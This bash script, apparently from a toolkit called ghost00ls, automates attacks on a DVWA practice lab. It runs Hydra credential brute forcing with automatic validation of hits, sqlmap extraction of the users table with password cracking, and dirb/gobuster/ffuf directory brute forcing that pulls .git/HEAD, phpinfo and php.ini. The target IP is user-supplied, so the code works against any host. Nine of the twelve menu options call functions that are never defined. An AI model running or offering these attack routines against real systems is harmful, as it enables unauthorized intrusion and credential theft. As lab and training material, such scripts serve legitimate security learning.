#!/bin/bash

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh

# Base logs
LOG_DIR="${HOME}/ghost00ls/logs/dvwa_exploits"
mkdir -p "$LOG_DIR"

# === Utilitaires ===

# Safe IP detection: prefer a private IPv4, fallback to 127.0.0.1
get_host_ip() {
    ip=$(hostname -I 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i ~ /^([0-9]{1,3}\.){3}[0-9]{1,3}$/) { print $i; exit }}')
    echo "${ip:-127.0.0.1}"
}

# portable urlencode using python3
urlenc() {
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"
    else
        # fallback minimal-safe replacement (not full RFC) for common payloads
        echo -n "$1" | sed -e 's/ /%20/g' -e 's/</%3C/g' -e 's/>/%3E/g' -e 's/\"/%22/g' -e "s/'/%27/g"
    fi
}

# === D√©pendances par attaque ===
declare -A ATTACK_TOOLS=(
    [hydra]="hydra"
    [sqlmap]="sqlmap"
    [dirb]="dirb"
    [gobuster]="gobuster"
    [wfuzz]="wfuzz"
    [curl]="curl"
    [rockyou]="wordlists"
)

install_tool() {
    case "$1" in
        hydra) sudo apt update && sudo apt install -y hydra ;;
        sqlmap) sudo apt update && sudo apt install -y sqlmap ;;
        dirb) sudo apt update && sudo apt install -y dirb ;;
        gobuster) sudo apt update && sudo apt install -y gobuster ;;
        wfuzz) sudo apt update && sudo apt install -y wfuzz ;;
        curl) sudo apt update && sudo apt install -y curl ;;
        wordlists)
            # paquet contenant rockyou selon distro (kali/ubuntu)
            if sudo apt install -y wordlists 2>/dev/null; then
                true
            else
                # fallback: try seeding rockyou from apt on other systems or leave notice
                echo "Installe rockyou manuellement si besoin (/usr/share/wordlists/rockyou.txt)"
            fi
        ;;
        *) echo "install_tool: inconnu: $1" ;;
    esac
}

check_tools() {
    local missing=0
    for tool in "$@"; do
        if [[ "$tool" == "wordlists" ]]; then
            if [[ ! -f /usr/share/wordlists/rockyou.txt && ! -f /usr/share/wordlists/rockyou.txt.gz ]]; then
                echo -e "${YELLOW}‚ö†Ô∏è rockyou introuvable ‚Üí installation...${NC}"
                install_tool wordlists
                missing=$((missing+1))
            else
                echo -e "${GREEN}‚úîÔ∏è rockyou OK${NC}"
            fi
        else
            if ! command -v "$tool" &>/dev/null; then
                echo -e "${YELLOW}‚ö†Ô∏è $tool manquant ‚Üí installation...${NC}"
                install_tool "$tool"
                missing=$((missing+1))
            else
                echo -e "${GREEN}‚úîÔ∏è $tool OK${NC}"
            fi
        fi
    done

    [[ $missing -eq 0 ]] && echo -e "${GREEN}‚úÖ Tous les outils pr√™ts${NC}\n"
}

# === Fonctions Attaques (extraits & am√©lior√©s) ===

exploit_hydra() {
    clear; banner
    echo -e "${MAGENTA}üîê [Hydra Brute Force - Wordlist selectable + validation automatique]${NC}"
    mkdir -p "$LOG_DIR/hydra" "$LOG_DIR/hydra/validated"
    DEFAULT_IP=$(get_host_ip)
    read -p "üåê IP cible (${DEFAULT_IP}): " IP
    IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (8081): " PORT
    PORT=${PORT:-8081}
    URL_PATH="/login.php"

    echo -e "${YELLOW}üìÇ Choisir la wordlist :${NC}"
    echo " 1) rockyou (/usr/share/wordlists/rockyou.txt)"
    echo " 2) mini (rapide fallback)"
    echo " 3) custom (chemin complet)"
    read -p "üëâ Choix (1/2/3) : " wl_choice

    WORDLIST=""
    TMP_CREATED=""
    case "$wl_choice" in
        1)
            if [[ -f /usr/share/wordlists/rockyou.txt ]]; then
                WORDLIST="/usr/share/wordlists/rockyou.txt"
            elif [[ -f /usr/share/wordlists/rockyou.txt.gz ]]; then
                TMP_CREATED="$(mktemp /tmp/rockyou.XXXXXX)"
                zcat /usr/share/wordlists/rockyou.txt.gz > "$TMP_CREATED"
                WORDLIST="$TMP_CREATED"
            else
                echo -e "${RED}‚ùå rockyou introuvable.${NC}"
                wl_choice=2
            fi
            ;;
        2)
            TMP_CREATED="$(mktemp /tmp/mini_hydra.XXXXXX)"
            cat > "$TMP_CREATED" <<'EOF'
123456
password
admin
toor
dvwa
EOF
            WORDLIST="$TMP_CREATED"
            ;;
        3)
            read -p "üìÅ Chemin complet du wordlist : " custom_path
            if [[ -f "$custom_path" ]]; then
                WORDLIST="$custom_path"
            else
                echo -e "${RED}‚ùå Fichier introuvable : $custom_path${NC}"
                [[ -n "$TMP_CREATED" ]] && rm -f "$TMP_CREATED"
                return
            fi
            ;;
        *)
            echo -e "${YELLOW}Choix invalide ‚Äî fallback mini.${NC}"
            TMP_CREATED="$(mktemp /tmp/mini_hydra.XXXXXX)"
            cat > "$TMP_CREATED" <<'EOF'
123456
password
admin
toor
dvwa
EOF
            WORDLIST="$TMP_CREATED"
            ;;
    esac

    read -p "üë• Utilisateurs (csv) [admin,gordonb,1337,pablo,smithy]: " USERS_IN
    USERS_IN=${USERS_IN:-admin,gordonb,1337,pablo,smithy}
    USERS_FILE="$(mktemp /tmp/hydra_users.XXXXXX)"
    echo "$USERS_IN" | tr ',' '\n' > "$USERS_FILE"

    TIMESTAMP="$(date +%F_%H-%M-%S)"
    OUT_LOG="$LOG_DIR/hydra/hydra_${TIMESTAMP}.log"

    echo -e "${YELLOW}üöÄ Lancement Hydra (timeout 300s)...${NC}"
    timeout 300 hydra -L "$USERS_FILE" -P "$WORDLIST" "$IP" -s "$PORT" http-post-form \
        "${URL_PATH}:username=^USER^&password=^PASS^&Login=Login:Login failed" \
        -t 6 -V 2>&1 | tee "$OUT_LOG"

    echo -e "\n${CYAN}üìä Extraction des paires depuis le log...${NC}"
    FOUND_TMP="/tmp/hydra_found_creds_${TIMESTAMP}.txt"
    grep -E "host: .*login: .*password:" "$OUT_LOG" 2>/dev/null \
      | sed -E 's/.*login: *([^ ]+).*password: *([^ ]+).*/\1:\2/' \
      | sort -u > "$FOUND_TMP" || true

    if [[ ! -s "$FOUND_TMP" ]]; then
        echo -e "${YELLOW}‚ö†Ô∏è Aucun credential trouv√© dans le log Hydra (ou format inattendu).${NC}"
        rm -f "$USERS_FILE" "$FOUND_TMP"
        [[ -n "$TMP_CREATED" ]] && rm -f "$TMP_CREATED"
        echo -e "${GREEN}‚úÖ Scan Hydra termin√©. Logs dans ${OUT_LOG}${NC}"
        read -p "üëâ Entr√©e pour revenir..."
        return
    fi

    echo -e "${CYAN}üîÅ Validation automatique des paires...${NC}"
    VALIDATED_CSV="$LOG_DIR/hydra/validated/hydra_validated_${TIMESTAMP}.csv"
    > "$VALIDATED_CSV"

    SUCCESS_REGEX="logout|welcome|index.php|logged in|You are now logged in|DVWA"

    while IFS=: read -r user pass; do
        COOKIE_JAR="$(mktemp /tmp/hydra_cookie.XXXXXX)"
        curl -s -c "$COOKIE_JAR" "http://${IP}:${PORT}/login.php" -o /dev/null

        curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -L \
            -d "username=${user}&password=${pass}&Login=Login" \
            "http://${IP}:${PORT}/login.php" -o /tmp/_hydra_res.html

        if grep -qiE "${SUCCESS_REGEX}" /tmp/_hydra_res.html; then
            echo "${user},${pass},VALID" >> "$VALIDATED_CSV"
            echo -e "${GREEN}‚úî VALID: ${user}:${pass}${NC}"
        else
            echo "${user},${pass},INVALID" >> "$VALIDATED_CSV"
            echo -e "${RED}‚úñ INVALID: ${user}:${pass}${NC}"
        fi
        rm -f "$COOKIE_JAR" /tmp/_hydra_res.html
    done < "$FOUND_TMP"

    # Nettoyage et suppression des doublons
    sort -u -o "$VALIDATED_CSV" "$VALIDATED_CSV"

    echo -e "\n${CYAN}üìÑ R√©sum√© validation:${NC}"
    column -t -s, "$VALIDATED_CSV"
    VALID_COUNT=$(grep -c ",VALID" "$VALIDATED_CSV" || echo 0)
    INVALID_COUNT=$(grep -c ",INVALID" "$VALIDATED_CSV" || echo 0)
    echo -e "\n${GREEN}‚úÖ Valid√©s: ${VALID_COUNT}${NC} | ${RED}Invalid√©s: ${INVALID_COUNT}${NC}"
    echo -e "${GREEN}R√©sultats valid√©s enregistr√©s dans: ${VALIDATED_CSV}${NC}"

    rm -f "$USERS_FILE" "$FOUND_TMP"
    [[ -n "$TMP_CREATED" ]] && rm -f "$TMP_CREATED"

    echo -e "\n${GREEN}‚úÖ Scan Hydra termin√©. Log Hydra: ${OUT_LOG}${NC}"
    read -p "üëâ Entr√©e pour revenir..."
}

###################################################################################################

exploit_sqlmap() {
    clear; banner
    echo -e "${MAGENTA}üß™ [SQL Injection - sqlmap]${NC}"
    echo "üìñ Objectif : tester simplement si sqlmap fonctionne avec DVWA"
    echo "‚ö†Ô∏è Risque : fuite de donn√©es (test local uniquement)"
    echo "üõ°Ô∏è Mitigation : requ√™tes pr√©par√©es, WAF, moindre privil√®ge DB"
    echo

    # Default LOG_DIR fallback
    : "${LOG_DIR:=${HOME}/ghost00ls/logs/dvwa_exploits}"
    mkdir -p "$LOG_DIR/sqlmap/validated"

    # --- Cible (IP / Port / Path / Query) ---
    DEFAULT_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    read -p "üåê IP cible (${DEFAULT_IP}): " IP
    IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (8081): " PORT
    PORT=${PORT:-8081}
    read -p "üìÅ Path vuln (default: /vulnerabilities/sqli/): " PATH_VULN
    PATH_VULN=${PATH_VULN:-/vulnerabilities/sqli/}
    read -p "üßæ Query string (default: ?id=1&Submit=Submit): " QUERY
    QUERY=${QUERY:-"?id=1&Submit=Submit"}

    TARGET="http://$IP:$PORT${PATH_VULN}${QUERY}"
    printf "\n"

    # --- DVWA creds (defaults) ---
    read -p "üë§ Utilisateur DVWA (default: admin): " DVWA_USER
    DVWA_USER=${DVWA_USER:-admin}
    read -p "üîë Mot de passe DVWA (default: password): " DVWA_PASS
    DVWA_PASS=${DVWA_PASS:-password}

    # --- sqlmap detection ---
    SQLMAP_PY="${HOME}/tools/sqlmap/sqlmap.py"
    if [ -f "$SQLMAP_PY" ]; then
        SQLMAP_CMD="python3 \"$SQLMAP_PY\""
    else
        if command -v sqlmap >/dev/null 2>&1; then
            SQLMAP_CMD="sqlmap"
        else
            echo -e "${RED}‚ùå sqlmap introuvable. Installe ~/tools/sqlmap ou ajoute sqlmap au PATH.${NC}"
            read -p "üëâ Entr√©e pour revenir..."
            return 1
        fi
    fi

    echo -e "\nüåê Target : ${TARGET}\n"

    # --- login to DVWA to get cookie ---
    echo -e "${YELLOW}üîë Connexion √† DVWA...${NC}"
    COOKIE_TMP="/tmp/sqlmap_cookie_${USER}"
    rm -f "$COOKIE_TMP"
    RAW_LOGIN_PAGE=$(curl -s -c "$COOKIE_TMP" -L "http://$IP:$PORT/login.php")
    USER_TOKEN=$(echo "$RAW_LOGIN_PAGE" | grep -Po "name=['\"]user_token['\"].*?value=['\"]\K[^'\"]+" || true)

    if [ -n "$USER_TOKEN" ]; then
        curl -s -b "$COOKIE_TMP" -c "$COOKIE_TMP" -L \
            -d "username=${DVWA_USER}&password=${DVWA_PASS}&Login=Login&user_token=${USER_TOKEN}" \
            "http://$IP:$PORT/login.php" >/dev/null
    else
        # try without token
        curl -s -b "$COOKIE_TMP" -c "$COOKIE_TMP" -L \
            -d "username=${DVWA_USER}&password=${DVWA_PASS}&Login=Login" \
            "http://$IP:$PORT/login.php" >/dev/null
    fi

    COOKIE_VALUE=$(awk '/PHPSESSID/ {print $7; exit}' "$COOKIE_TMP" 2>/dev/null || true)
    if [ -z "$COOKIE_VALUE" ]; then
        echo -e "${RED}‚ùå Echec r√©cup√©ration PHPSESSID. V√©rifie l'URL/DVWA/login/credentials.${NC}"
        read -p "üëâ Entr√©e pour revenir..."
        return 1
    fi
    COOKIE="PHPSESSID=${COOKIE_VALUE}; security=low"
    echo -e "‚úî Session ouverte (PHPSESSID=${COOKIE_VALUE})"
    echo

    # --- prepare output dir & logs ---
    TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
    OUT_DIR="$LOG_DIR/sqlmap/validated/$TIMESTAMP"
    mkdir -p "$OUT_DIR"
    LOG_DBS="$OUT_DIR/sqlmap_dbs.log"
    LOG_TABLES="$OUT_DIR/sqlmap_tables.log"
    LOG_USERS="$OUT_DIR/sqlmap_users.log"
    LOG_RAW="$OUT_DIR/sqlmap_raw.log"

    SQLMAP_OPTS="--cookie=\"$COOKIE\" --batch --level=2 --risk=1 --random-agent --tamper=space2comment --output-dir=\"$OUT_DIR\""

    echo -e "${YELLOW}‚ñ∂ Test sqlmap --dbs...${NC}"
    eval $SQLMAP_CMD "\"$TARGET\"" $SQLMAP_OPTS --dbs 2>&1 | tee "$LOG_DBS" "$LOG_RAW"

    echo -e "\n${YELLOW}‚ñ∂ Extraction des tables (dvwa)...${NC}"
    eval $SQLMAP_CMD "\"$TARGET\"" $SQLMAP_OPTS -D dvwa --tables 2>&1 | tee -a "$LOG_TABLES" "$LOG_RAW"

    echo -e "\n${YELLOW}‚ñ∂ Dump dvwa.users (si pr√©sente)...${NC}"
    eval $SQLMAP_CMD "\"$TARGET\"" $SQLMAP_OPTS -D dvwa -T users --dump 2>&1 | tee -a "$LOG_USERS" "$LOG_RAW"

    # --- R√©sum√© ---
    echo -e "\n${CYAN}üìä R√©sum√© des r√©sultats sqlmap :${NC}\n"
    echo -e "‚Ä¢ Dossiers de sortie : ${OUT_DIR}\n"

    echo -e "‚Ä¢ Bases d√©tect√©es :"
    if grep -q -E "dvwa|information_schema" "$LOG_DBS" 2>/dev/null; then
        grep -E "dvwa|information_schema" "$LOG_DBS" | sed -n '1,200p'
    else
        if grep -q "available databases" "$LOG_DBS" 2>/dev/null; then
            sed -n '/available databases/,$p' "$LOG_DBS" | sed -n '1,20p'
        else
            echo -e "${RED}  ‚ùå Aucune base trouv√©e${NC}"
        fi
    fi
    echo

    echo -e "‚Ä¢ Tables de dvwa :"
    if [ -f "$LOG_TABLES" ] && grep -q -E "Table|users|guestbook" "$LOG_TABLES" 2>/dev/null; then
        grep -E "Table:|users|guestbook" "$LOG_TABLES" | sed -n '1,200p'
    else
        # fallback search in raw log
        if grep -q -E "users|guestbook" "$LOG_RAW" 2>/dev/null; then
            grep -E "users|guestbook" "$LOG_RAW" | sed -n '1,200p'
        else
            echo -e "${RED}  ‚ùå Aucune table trouv√©e${NC}"
        fi
    fi
    echo

    # --- Post-processing: show dumped users CSV if present ---
    USERS_CSV_PATH=""
    # sqlmap usually dumps to /<OUT_DIR>/<target>/dump/dvwa/users.csv
    POSSIBLE_CSV=$(find "$OUT_DIR" -type f -path "*/dump/dvwa/users.csv" -print -quit 2>/dev/null || true)
    if [ -n "$POSSIBLE_CSV" ]; then
        USERS_CSV_PATH="$POSSIBLE_CSV"
        echo -e "‚Ä¢ Contenu extrait (dvwa.users) :"
        # show pretty table (simple)
        column -t -s, "$USERS_CSV_PATH" 2>/dev/null | sed -n '1,200p' || cat "$USERS_CSV_PATH" | sed -n '1,200p'
        echo
    else
        # try to extract from sqlmap logs
        if grep -q "Table: users" "$LOG_USERS" 2>/dev/null || grep -q "table 'dvwa.users' dumped" "$LOG_RAW" 2>/dev/null; then
            echo -e "‚Ä¢ Contenu extrait (dvwa.users) (log):"
            sed -n '/Table: users/,/^\s*$/p' "$LOG_USERS" 2>/dev/null | sed -n '1,200p'
            echo
        else
            echo -e "${RED}  ‚ùå Aucun dump users trouv√©${NC}\n"
        fi
    fi

    # --- Show cracked passwords if sqlmap attempted cracking ---
    echo -e "‚Ä¢ R√©sultat tentative de craquage de mots de passe (sqlmap) :"
    if grep -q "cracked password" "$LOG_RAW" 2>/dev/null; then
        grep --color=never -E "cracked password '.*' for hash '([0-9a-fA-F]{32}|[0-9a-fA-F]{40}|[0-9a-fA-F]{64})'" "$LOG_RAW" | sed -E "s/cracked password '([^']+)' for hash '([0-9a-fA-F]+)'/  ‚Ä¢ \1 => \2/"
    else
        echo -e "  ‚ö†Ô∏è Aucune entr√©e de craquage automatique trouv√©e dans les logs."
    fi
    echo

    # --- Save validated summary CSV ---
    VALID_CSV="$OUT_DIR/sqlmap_validated_${TIMESTAMP}.csv"
    {
        echo "target,dbs_found,tables_found,users_dumped,users_csv,log_dir"
        DBS_COUNT=$(grep -c -E "dvwa|information_schema" "$LOG_DBS" 2>/dev/null || echo 0)
        TABLES_COUNT=$(grep -c -E "users|guestbook" "$LOG_TABLES" 2>/dev/null || echo 0)
        USERS_DUMPED=$( [ -n "$USERS_CSV_PATH" ] && echo 1 || grep -c "Table: users" "$LOG_USERS" 2>/dev/null || echo 0 )
        echo "\"$TARGET\",\"$DBS_COUNT\",\"$TABLES_COUNT\",\"$USERS_DUMPED\",\"$USERS_CSV_PATH\",\"$OUT_DIR\""
    } > "$VALID_CSV"

    echo -e "${GREEN}‚úÖ Exploitation sqlmap termin√©e.${NC}"
    echo -e "üîé Logs complets dans : $OUT_DIR"
    echo -e "‚úÖ R√©sum√© sauvegard√© : $VALID_CSV"
    read -p "üëâ Entr√©e pour revenir..."
}



###################################################################################################

exploit_dirb() {
    clear; banner

    echo -e "${MAGENTA}üß™ [Directory Bruteforce - dirb/gobuster/ffuf]${NC}"
    echo "üìñ Objectif : d√©couvrir des r√©pertoires/fichiers cach√©s sur la cible"
    echo "‚ö†Ô∏è Risque : bruit r√©seau important, d√©tection IDS/IPS possible (test local uniquement)"
    echo "üõ°Ô∏è Mitigation : limiter l‚Äôexposition, WAF, config serveur stricte"
    echo

    # defaults
    DEFAULT_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    read -p "üåê IP cible (${DEFAULT_IP}): " IP
    IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (8081): " PORT
    PORT=${PORT:-8081}
    read -p "üìÅ Path de d√©part (default: /): " START_PATH
    START_PATH=${START_PATH:-/}
    read -p "üìÇ Wordlist (default: /usr/share/wordlists/dirb/common.txt): " WORDLIST
    WORDLIST=${WORDLIST:-/usr/share/wordlists/dirb/common.txt}

    TARGET="http://$IP:$PORT${START_PATH}"
    printf "\nüåê Target : %s\nüìÇ Wordlist : %s\n\n" "$TARGET" "$WORDLIST"

    # log dir
    : "${LOG_DIR:=${HOME}/ghost00ls/logs/dvwa_exploits}"
    TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
    OUT_DIR="$LOG_DIR/dirb/$TIMESTAMP"
    mkdir -p "$OUT_DIR"

    DIRB_LOG="$OUT_DIR/dirb_raw.txt"
    GOBUSTER_LOG="$OUT_DIR/gobuster_raw.txt"
    FFUF_LOG="$OUT_DIR/ffuf_raw.txt"
    COMBINED="$OUT_DIR/combined_paths.txt"

    # check tools
    HAS_DIRB=0
    HAS_GOBUSTER=0
    HAS_FFUF=0

    if command -v dirb >/dev/null 2>&1; then HAS_DIRB=1; fi
    if command -v gobuster >/dev/null 2>&1; then HAS_GOBUSTER=1; fi
    if command -v ffuf >/dev/null 2>&1; then HAS_FFUF=1; fi

    if [ $HAS_DIRB -eq 0 ]; then
        echo -e "${RED}‚ùå dirb introuvable. Installe dirb ou adapte la fonction.${NC}"
        read -p "üëâ Entr√©e pour revenir..."
        return 1
    fi

    # ask options
    read -p "‚ñ∂ Voulez-vous que dirb fasse un scan r√©cursif (aggressif)? [y/N]: " DIRB_RECUR
    DIRB_RECUR=${DIRB_RECUR:-N}
    if [ "$DIRB_RECUR" = "y" ] || [ "$DIRB_RECUR" = "Y" ]; then
        DIRB_OPT="-r"
    else
        DIRB_OPT=""
    fi

    # Offer gobuster / ffuf if available
    RUN_GOBUSTER="n"
    RUN_FFUF="n"
    if [ $HAS_GOBUSTER -eq 1 ]; then
        read -p "‚ñ∂ gobuster trouv√©. Voulez-vous lancer gobuster aussi ? [y/N]: " tmp
        tmp=${tmp:-N}
        if [ "$tmp" = "y" ] || [ "$tmp" = "Y" ]; then RUN_GOBUSTER="y"; fi
    fi
    if [ $HAS_FFUF -eq 1 ]; then
        read -p "‚ñ∂ ffuf trouv√©. Voulez-vous lancer ffuf (rapide/multi-thread) ? [y/N]: " tmp2
        tmp2=${tmp2:-N}
        if [ "$tmp2" = "y" ] || [ "$tmp2" = "Y" ]; then RUN_FFUF="y"; fi
    fi

    echo -e "${YELLOW}‚ñ∂ Scan avec dirb...${NC}"
    # dirb output file parameter differs by install; use -o
    # make output file; run non-interactive
    dirb "$TARGET" "$WORDLIST" $DIRB_OPT -o "$DIRB_LOG" >/dev/null 2>&1 || true
    # ensure file exists
    touch "$DIRB_LOG"

    # gobuster
    if [ "$RUN_GOBUSTER" = "y" ]; then
        echo -e "\n${YELLOW}‚ñ∂ Scan avec gobuster (multithread)...${NC}"
        # -q quiet, but we want output file, follow redirects (-r) and 40 threads
        gobuster dir -u "$TARGET" -w "$WORDLIST" -t 40 -r -o "$GOBUSTER_LOG" >/dev/null 2>&1 || true
        touch "$GOBUSTER_LOG"
    fi

    # ffuf
    if [ "$RUN_FFUF" = "y" ]; then
        echo -e "\n${YELLOW}‚ñ∂ Scan avec ffuf (rapide)...${NC}"
        # Use ffuf with follow redirects disabled (safer) and write raw
        ffuf -u "${TARGET}FUZZ" -w "$WORDLIST" -t 40 -mc all -o "$FFUF_LOG" -of md >/dev/null 2>&1 || true
        touch "$FFUF_LOG"
    fi

    # combine findings into a single file (unique)
    : > "$COMBINED"
    # dirb: extract lines starting with + or ==>
    if [ -s "$DIRB_LOG" ]; then
        grep -E "^\+ |^==>" "$DIRB_LOG" | sed 's/^[+ ]*//' >> "$COMBINED" 2>/dev/null || true
    fi
    # gobuster: lines like /path (Status: ...)
    if [ -s "$GOBUSTER_LOG" ]; then
        grep -E "^/" "$GOBUSTER_LOG" | sed -E 's/^[[:space:]]*//' >> "$COMBINED" 2>/dev/null || true
    fi
    # ffuf: parse its md output for first column (if used)
    if [ -s "$FFUF_LOG" ]; then
        # FFUF md rows contain path names at line start; extract common patterns
        grep -E "^/|^\." "$FFUF_LOG" | sed -E 's/^[[:space:]]*//' >> "$COMBINED" 2>/dev/null || true
    fi
    # canonicalize and unique
    sort -u "$COMBINED" -o "$COMBINED" 2>/dev/null || true

    # Attempt quick downloads of interesting items (robots, phpinfo, .git/HEAD, favicon, php.ini)
    if grep -q -E "/robots.txt|robots.txt" "$COMBINED" 2>/dev/null; then
        echo -e "${YELLOW}‚ñ∂ Extraction robots.txt / sauvegarde${NC}"
        curl -sSL --max-time 10 "$TARGET/robots.txt" -o "$OUT_DIR/robots.txt" || true
    fi
    if grep -q -E "phpinfo.php|phpinfo" "$COMBINED" 2>/dev/null; then
        echo -e "${YELLOW}‚ñ∂ Tentative sauvegarde phpinfo.php${NC}"
        curl -sSL --max-time 10 "$TARGET/phpinfo.php" -o "$OUT_DIR/phpinfo.html" || true
    fi
    if grep -q -E ".git/HEAD|/\.git/HEAD" "$COMBINED" 2>/dev/null; then
        echo -e "${YELLOW}‚ñ∂ .git/HEAD trouv√© ‚Äî tentative de r√©cup√©ration HEAD${NC}"
        curl -sSL --max-time 10 "$TARGET/.git/HEAD" -o "$OUT_DIR/git_HEAD" || true
    fi
    if grep -q -E "favicon.ico" "$COMBINED" 2>/dev/null; then
        curl -sSL --max-time 10 "$TARGET/favicon.ico" -o "$OUT_DIR/favicon.ico" || true
    fi
    if grep -q -E "php.ini" "$COMBINED" 2>/dev/null; then
        curl -sSL --max-time 10 "$TARGET/php.ini" -o "$OUT_DIR/php.ini" || true
    fi

    # Save a clean "paths" summary (human readable)
    PATHS_SUMMARY="$OUT_DIR/paths_summary.txt"
    {
        echo "=== Combined discovered paths ($(date)) ==="
        echo
        if [ -s "$COMBINED" ]; then
            sed -n '1,500p' "$COMBINED"
        else
            echo "  (aucun r√©sultat trouv√©)"
        fi
    } > "$PATHS_SUMMARY"

    # Create CSV summary
    SUMMARY_CSV="$OUT_DIR/dirb_summary_${TIMESTAMP}.csv"
    DB_DIRB_FOUND=$(grep -c -E "^\+ |^==>|/\.git/HEAD|robots.txt|phpinfo|favicon.ico|php.ini" "$DIRB_LOG" 2>/dev/null || echo 0)
    GB_FOUND=0
    FF_FOUND=0
    if [ -s "$GOBUSTER_LOG" ]; then GB_FOUND=$(grep -c "^/" "$GOBUSTER_LOG" 2>/dev/null || echo 0); fi
    if [ -s "$FFUF_LOG" ]; then FF_FOUND=$(grep -c "^\." "$FFUF_LOG" 2>/dev/null || echo 0); fi
    TOTAL_COMBINED=$(wc -l < "$COMBINED" 2>/dev/null || echo 0)

    {
        echo "timestamp,target,dirb_found,gobuster_found,ffuf_found,combined_count,log_dir"
        echo "\"$TIMESTAMP\",\"$TARGET\",\"$DB_DIRB_FOUND\",\"$GB_FOUND\",\"$FF_FOUND\",\"$TOTAL_COMBINED\",\"$OUT_DIR\""
    } > "$SUMMARY_CSV"

    # --- Pretty terminal summary (verbeux) ---
    echo
    echo -e "${CYAN}üìä R√©sum√© des r√©sultats dirb/gobuster/ffuf :${NC}"
    echo
    echo -e "‚Ä¢ Dossier de sortie : ${OUT_DIR}"
    echo
    echo -e "‚Ä¢ R√©sultats dirb (extraits) :"
    if [ -s "$DIRB_LOG" ]; then
        grep -E "^\+ |^==>" "$DIRB_LOG" | sed 's/^[+ ]*//' | sed -n '1,200p' || echo "  (vide)"
    else
        echo "  ‚ùå Pas de log dirb"
    fi
    echo

    if [ "$RUN_GOBUSTER" = "y" ]; then
        echo -e "‚Ä¢ R√©sultats gobuster (extraits) :"
        if [ -s "$GOBUSTER_LOG" ]; then
            grep -E "^/" "$GOBUSTER_LOG" | sed -n '1,200p' || echo "  (vide)"
        else
            echo "  ‚ùå Pas de log gobuster"
        fi
        echo
    fi

    if [ "$RUN_FFUF" = "y" ]; then
        echo -e "‚Ä¢ R√©sultats ffuf (extraits) :"
        if [ -s "$FFUF_LOG" ]; then
            sed -n '1,200p' "$FFUF_LOG" || echo "  (vide)"
        else
            echo "  ‚ùå Pas de log ffuf"
        fi
        echo
    fi

    echo -e "‚Ä¢ Chemins combin√©s (extraits) :"
    if [ -s "$COMBINED" ]; then
        sed -n '1,200p' "$COMBINED"
    else
        echo "  (aucun chemin combin√© trouv√©)"
    fi
    echo

    # show saved special files
    echo -e "‚ñ∂ Fichiers r√©cup√©r√©s (si pr√©sents) :"
    [ -f "$OUT_DIR/robots.txt" ] && echo "  ‚Ä¢ robots.txt -> $OUT_DIR/robots.txt"
    [ -f "$OUT_DIR/phpinfo.html" ] && echo "  ‚Ä¢ phpinfo -> $OUT_DIR/phpinfo.html"
    [ -f "$OUT_DIR/git_HEAD" ] && echo "  ‚Ä¢ .git/HEAD -> $OUT_DIR/git_HEAD"
    [ -f "$OUT_DIR/favicon.ico" ] && echo "  ‚Ä¢ favicon.ico -> $OUT_DIR/favicon.ico"
    [ -f "$OUT_DIR/php.ini" ] && echo "  ‚Ä¢ php.ini -> $OUT_DIR/php.ini"
    echo

    echo -e "${GREEN}‚úÖ Bruteforce termin√©.${NC}"
    echo -e "üîé Logs complets dans : $OUT_DIR"
    echo -e "‚úÖ R√©sum√© sauvegard√© : $SUMMARY_CSV"
    read -p "üëâ Entr√©e pour revenir..."
}


###################################################################################################




###################################################################################################



###################################################################################################



###################################################################################################



###################################################################################################



###################################################################################################



###################################################################################################

# === Menu ===
menu_exploits() {
    clear; banner
    echo -e "${CYAN}=== üí£ Exemples d‚Äôexploitation DVWA (Ghost00ls) ===${NC}"
    echo "1) Hydra Brute Force"
    echo "2) SQL Injection (sqlmap)"
    echo "3) Directory Bruteforce (dirb/gobuster)"
    echo "4) Fuzzing (wfuzz)"
    echo "5) XSS"
    echo "6) Command Injection"
    echo "7) File Upload"
    echo "8) File Inclusion (LFI/RFI)"
    echo "9) CSRF"
    echo "10) Broken Auth"
    echo "11) IDOR"
    echo "12) Security Misconfiguration"
    echo "0) Quit"
    echo
    read -p "üëâ Choix : " choice

    case $choice in
        1) exploit_hydra ;;
        2) exploit_sqlmap ;;
        3) exploit_dirb ;; 
        4) exploit_wfuzz ;;
        5) exploit_xss ;;
        6) exploit_cmdinj ;;
        7) exploit_upload ;;
        8) exploit_lfi ;;
        9) exploit_csrf ;;
        10) exploit_auth ;;
        11) exploit_idor ;;
        12) exploit_misconfig ;;
        0) exit 0 ;;
        *) echo -e "${RED}‚ùå Option invalide${NC}" ;;
    esac
    menu_exploits
}

menu_exploits
